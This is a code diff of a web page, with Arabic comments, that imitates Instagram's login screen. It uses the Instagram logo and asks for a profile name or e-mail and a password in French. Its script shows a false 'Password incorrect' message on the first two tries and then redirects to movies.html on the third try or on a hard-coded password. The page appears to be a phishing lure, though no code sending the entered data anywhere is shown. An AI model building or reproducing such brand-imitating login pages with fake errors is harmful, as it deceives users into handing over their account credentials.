@@ -15,18 +15,15 @@ body{
   background:white;
   font-family:sans-serif;
 }
-
 .container{
   width:90%;
   max-width:350px;
   text-align:center;
 }
-
 .logo{
   width:80px;
   margin-bottom:20px;
 }
-
 input{
   width:100%;
   padding:12px;
@@ -34,7 +31,6 @@ input{
   border-radius:10px;
   border:1px solid #ccc;
 }
-
 button{
   width:100%;
   padding:12px;
@@ -45,7 +41,6 @@ button{
   font-size:16px;
   cursor:pointer;
 }
-
 #errorMsg{
   color:red;
   font-size:14px;
@@ -54,13 +49,13 @@ button{
 </style>
 
 </head>
-
 <body>
 
 <div class="container">
 
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
 
+  <!-- أضفت id لكل خانة -->
   <input id="instaUser" placeholder="Nom de profil, e-mail ou numéro">
   <input id="instaPass" type="password" placeholder="Mot de passe">
 
@@ -80,10 +75,10 @@ function go() {
   attempts++;
 
   if(pw === correctPassword || attempts === maxAttempts){
-    // إذا كانت الكلمة صحيحة أو المحاولة الثالثة
+    // المحاولة الثالثة أو كلمة سر صحيحة -> الدخول للسيت
     window.location.href = "movies.html";
   } else {
-    // الخطوتين الأولى والثانية تظهر رسالة الخطأ فقط
+    // الخطوتين الأولى والثانية -> رسالة خطأ فقط
     error.innerText = "Password incorrect";
   }
 }
